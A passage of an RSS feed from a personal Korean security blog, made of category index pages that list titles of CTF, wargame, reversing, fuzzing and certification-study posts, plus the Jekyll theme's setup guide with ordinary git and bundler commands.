      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step2-2&quot;&gt;System Hackig Step 2-2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/step2-1&quot;&gt;System Hackig Step 2&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#system_hacking&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/system_hacking&quot;&gt;system_hacking&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;system_hacking&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2025-02-02-FIESTA2024-cert1&quot;&gt;FIESTA2024 침해대응 1 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/2024-12-01-out-of-bound&quot;&gt;Dreamhack-out of bound 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/dreamhack_system_hacking/2024-12-01-basic_exploitation_001&quot;&gt;Dreamhack-basic_exploitation_001 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/2024-12-01-Return-Address-Overwrite&quot;&gt;Dreamhack-Return Address Overwrite 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/plt-got-overwrite&quot;&gt;PLT &amp;amp; GOT Overwrite in x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-format1/&quot;&gt;Protostar-format1.c x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/memory-exploit-mitigation-bypass-01/&quot;&gt;Memory Exploit Mitigations and How to Bypass them 01&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#protostar&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/protostar&quot;&gt;protostar&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;protostar&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/plt-got-overwrite&quot;&gt;PLT &amp;amp; GOT Overwrite in x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-format1/&quot;&gt;Protostar-format1.c x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/system_hacking/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#certification_study&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/certification_study&quot;&gt;certification_study&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;certification_study&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/certification_study/financial2&quot;&gt;금융보안원 및 KISA 준비 자료 공유&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/certification_study/cert_pass&quot;&gt;정보보안기사 동회차 합격 후기&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/certification_study/net-manage-snmp-ssh&quot;&gt;정보보안기사 실기 공부 - 네트워크 5대 관리 기능, SNMP, SSH&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/certification_study/net-gadgets-vlan&quot;&gt;정보보안기사 실기 공부 - 네트워크 장비와 VLAN&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/certification_study/net_vpn&quot;&gt;정보보안기사 실기 공부 - VPN과 IPSec&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#paper_study&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/paper_study&quot;&gt;paper_study&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;paper_study&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-27-CVE-2024-28283&quot;&gt;CVE-2024-28283 분석과 KARONTE fuzzer 활용&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-26-KARONTE&quot;&gt;KARONTE: Detecting Insecure Multi-binary Interactions in Embedded Firmware 읽기&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/financial&quot;&gt;금융사이버보안이슈 정리 백업&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/airgap-break-using-gyro-resonance&quot;&gt;[논문 재현] Gyroscope 센서의 공진을 이용한 Airgap Break 논문 재현 프로젝트(1)&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/sybil-based&quot;&gt;[논문 스터디] Mitigations on Sybil-Based Double-Spend Attacks in Bitcoin&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/air-fi&quot;&gt;[논문 스터디] Air-Fi: Leaking Data From Air-Gapped Computers Using Wi-Fi Frequencies&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#network_hacking&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/network_hacking&quot;&gt;network_hacking&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;network_hacking&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/ipsecVuln01&quot;&gt;Searching for IPSec Vulnerability from Its Specification Level&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/airgap-break-using-gyro-resonance&quot;&gt;[논문 재현] Gyroscope 센서의 공진을 이용한 Airgap Break 논문 재현 프로젝트(1)&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/air-fi&quot;&gt;[논문 스터디] Air-Fi: Leaking Data From Air-Gapped Computers Using Wi-Fi Frequencies&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#blockchain&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/blockchain&quot;&gt;blockchain&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;blockchain&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/sybil-based&quot;&gt;[논문 스터디] Mitigations on Sybil-Based Double-Spend Attacks in Bitcoin&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#reversing&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/reversing&quot;&gt;reversing&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;reversing&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2025-02-02-FIESTA2024-cert1&quot;&gt;FIESTA2024 침해대응 1 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-25-fsi-fiesta2024-S2-1&quot;&gt;FIESTA2024 S2-1 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-8&quot;&gt;Dreamhack-rev-basic-8 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-6&quot;&gt;Dreamhack-rev-basic-6 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-4&quot;&gt;Dreamhack-rev-basic-4 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-3&quot;&gt;Dreamhack-rev-basic-3 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/reversing/2024-12-01-rev-basic-2&quot;&gt;Dreamhack-rev-basic-2 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/paper_study/reversing/chaining&quot;&gt;Dreamhack-Reversing-Chaining 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#my_life&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/my_life&quot;&gt;my_life&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;my_life&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/Diary/241201&quot;&gt;2024년 회고&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/Diary/240420&quot;&gt;입사 4개월 반, 근황 공유&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#web_hacking&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/web_hacking&quot;&gt;web_hacking&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;web_hacking&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/web_hacking/2024-12-01-bypassIf&quot;&gt;Dreamhack-bypassIf 문제 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#fuzzing&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/fuzzing&quot;&gt;fuzzing&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;fuzzing&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-27-CVE-2024-28283&quot;&gt;CVE-2024-28283 분석과 KARONTE fuzzer 활용&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/fuzzing/2025-01-26-KARONTE&quot;&gt;KARONTE: Detecting Insecure Multi-binary Interactions in Embedded Firmware 읽기&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

  &lt;div class=&quot;category-box&quot;&gt;
    
    &lt;div id=&quot;#forensic&quot;&gt;&lt;/div&gt;
    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/forensic&quot;&gt;forensic&lt;/a&gt;&lt;/h4&gt;
    &lt;a name=&quot;forensic&quot;&gt;&lt;/a&gt;
     
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    
    &lt;article class=&quot;center&quot;&gt;
      &lt;h6&gt;&lt;a href=&quot;/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1 풀이&lt;/a&gt;&lt;/h6&gt;
    &lt;/article&gt;


    

  &lt;/div&gt;

&lt;/div&gt;

</description>
            <link>https://touBVa.github.io/blog/categories/</link>
          </item>
        
      
    
      
        
          <item>
            <title>certification_study</title>
            <description>&lt;h5&gt; Posts by Category : certification_study &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;02 Jun 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/paper_study/sybil-based&quot;&gt;[논문 스터디] Mitigations on Sybil-Based Double-Spend Attacks in Bitcoin&lt;/a&gt;&lt;/li&gt;

&lt;/div&gt;
</description>
            <link>https://touBVa.github.io/blog/categories/blockchain/</link>
          </item>
        
      
    
      
        
          <item>
            <title>certification_study</title>
            <description>&lt;h5&gt; Posts by Category : certification_study &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;05 Dec 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/certification_study/financial2&quot;&gt;금융보안원 및 KISA 준비 자료 공유&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;28 May 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/certification_study/cert_pass&quot;&gt;정보보안기사 동회차 합격 후기&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;22 Mar 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/certification_study/net-manage-snmp-ssh&quot;&gt;정보보안기사 실기 공부 - 네트워크 5대 관리 기능, SNMP, SSH&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;21 Mar 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/certification_study/net-gadgets-vlan&quot;&gt;정보보안기사 실기 공부 - 네트워크 장비와 VLAN&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;17 Mar 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/certification_study/net_vpn&quot;&gt;정보보안기사 실기 공부 - VPN과 IPSec&lt;/a&gt;&lt;/li&gt;

&lt;/div&gt;
</description>
            <link>https://touBVa.github.io/blog/categories/certification_study/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>system_hacking_basic</title>
            <description>&lt;h5&gt; Posts by Category : system_hacking_basic &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;03 Feb 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step6/ssp_001&quot;&gt;System Hacking Step 6: ssp_001&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;08 Jan 2023&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step6-1&quot;&gt;System Hacking Step 6-1&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;28 Dec 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-basic_exploitation_000&quot;&gt;Wargame: Basic_Exploitation_000&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;22 Aug 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-3&quot;&gt;System Hackig Step 5-3&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;17 Aug 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-2&quot;&gt;System Hackig Step 5-2&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;12 Aug 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step5-1&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;28 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step4-2&quot;&gt;System Hackig Step 4-2: Shell_basic&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;20 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step4-1&quot;&gt;System Hackig Step 4&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;15 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step3-2&quot;&gt;System Hackig Step 3-2&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;10 Jul 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step3-1&quot;&gt;System Hackig Step 3-1&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;28 Jun 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step2-2&quot;&gt;System Hackig Step 2-2&lt;/a&gt;&lt;/li&gt;

 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;22 Jun 2022&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;/blog/dreamhack_system_hacking/step2-1&quot;&gt;System Hackig Step 2&lt;/a&gt;&lt;/li&gt;

&lt;/div&gt;
</description>
            <link>https://touBVa.github.io/blog/categories/dreamhack_system_hacking/</link>
          </item>
        
      
    
      
    
      
        
          <item>
            <title>Web Hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.forensic %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/forensic/</link>
          </item>
        
      
    
      
        
          <item>
            <title>fuzzing</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.fuzzing %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/fuzzing/</link>
          </item>
        
      
    
      
    
      
    
      
    
      
    
      
        
          <item>
            <title>Get Started</title>
            <description>## Getting Started - How to use “devlopr-jekyll” theme

## What&apos;s Jekyll ?

If you aren’t familiar with Jekyll yet, you should know that it is a static site generator. It will transform your plain text into static websites and blogs. No more databases, slow loading websites, risk of being hacked…just your content. And not only that, with Jekyll you get free hosting with GitHub Pages! If you are a beginner we recommend you start with [Jekyll’s Docs](https://jekyllrb.com/docs/installation/). Now, if you know how to use Jekyll, let’s move on to using this theme in Jekyll:

## Watch Tutorial

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/cXBEfpn0qrg?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;


### Steps to create your blog using devlopr-jekyll and Host using Github Pages :

&gt;  **Step 1.**  Fork the repo - [click here](https://github.com/sujaykundu777/devlopr-jekyll/fork)

![Devlopr Jekyll Repo](/assets/img/posts/fork1.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 2.** Use **your-github-username.github.io** as the new repo  ( Replace your-github-username with yours). Remember if you use the name other than your-github-username.github.io , your blog will be built using gh-pages branch.

![Devlopr Jekyll Repo](/assets/img/posts/fork2.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork3.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 3.** Clone the new repo locally to make changes :

![Devlopr Jekyll Repo](/assets/img/posts/fork31.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork32.PNG){:class=&quot;img-fluid&quot;}

![Devlopr Jekyll Repo](/assets/img/posts/fork33.PNG){:class=&quot;img-fluid&quot;}

```bash
 $ git clone https://github.com/yourusername/yourusername.github.io
 $ cd yourusername.github.io
 $ code .
```

&gt; **Step 4.** Open the files using VSCode and edit _config.yml and edit with your details:

- _config.yml file - replace with your own details
- _posts - Add your blog posts here
- _includes - You can replace the contents of the files with your data. (contains widgets)
- _assets/img - Add all your images here

![Devlopr Jekyll Repo](/assets/img/posts/fork34.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 5** - Install the development requirements:

### Set up local development environment

1. [Git](https://git-scm.com/)
2. [Ruby](https://www.ruby-lang.org/) and [Bundler](https://bundler.io/)
3. [VSCode](https://code.visualstudio.com/download)

We need ruby and bundler to build our site locally. After installation check if its working:

For ruby :

```bash
$ ruby -v
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
```
For bundler :

```bash
$ gem install bundler
$ bundler -v
Bundler version 2.2.29
```
Add jekyll :

```bash
$ bundle update
$ bundle add jekyll
```
 This command will add the Jekyll gem to our Gemfile and install it to the ./vendor/bundle/ folder.

You can check the jekyll version

```
$ bundle exec jekyll -v
jekyll 4.2.0
```

&gt; **Step 6.** Install the gem dependencies by running the following command

```bash
$ bundle update
$ bundle install
```

&gt; **Step 7.** Serve the site locally by running the following command below:

```bash
$ bundle exec jekyll serve --watch
```
or you can also serve using :

```bash
$ jekyll serve
```

Visit [http://localhost:4000](http://localhost:4000) for development server

![Devlopr Jekyll Repo](/assets/img/posts/fork41.PNG){:class=&quot;img-fluid&quot;}


### Adding Content

Start populating your blog by adding your .md files in _posts. devlopr-jekyll already has a few examples.

#### YAML Post Example:

```yml
---
layout: post
title: Sample Post
author: Sujay Kundu
date: &apos;2019-05-21 14:35:23 +0530&apos;
category:
        - jekyll
summary: This is the summary for the sample post
thumbnail: sample.png
---

Hi ! This is sample post.

```

#### YAML Page Example:

```yml
---
layout: page
title: Sample Page
permalink: /sample-page/
---

Hi ! This is sample page.
```

#### Editing stylesheet

You’ll only work with a single file to edit/add theme style: assets/css/main.scss.

### Deploy your Changes

Once happy with your blog changes. Push your changes to master branch.

&gt; **Step 8.** Push Your Local Changes

```bash
 $ git add .
 $ git commit -m &quot;my new blog using devlopr-jekyll&quot;
 $ git push origin master
```

Visit your Github Repo settings ! Enable master branch as Github Pages Branch :

![Devlopr Jekyll Repo](/assets/img/posts/fork6.PNG){:class=&quot;img-fluid&quot;}

&gt; **Step 9.** Deploy your Blog :

![Devlopr Jekyll Repo](/assets/img/posts/fork7.PNG){:class=&quot;img-fluid&quot;}

&gt; Congrats ! On your new shining Blog !

You can visit the blog using [http://your-github-username.github.io](http://your-github-username.github.io).

</description>
            <link>https://touBVa.github.io/get-started/</link>
          </item>
        
      
    
      
    
      
    
      
        
          <item>
            <title>my_life</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.my_life %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/my_life/</link>
          </item>
        
      
    
      
        
          <item>
            <title>certification_study</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.network_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/network_hacking/</link>
          </item>
        
      
    
      
        
          <item>
            <title>paper_study</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.paper_study %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/paper_study/</link>
          </item>
        
      
    
      
        
          <item>
            <title>protostar</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.protostar %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/protostar/</link>
          </item>
        
      
    
      
        
          <item>
            <title>reversing</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.reversing %}
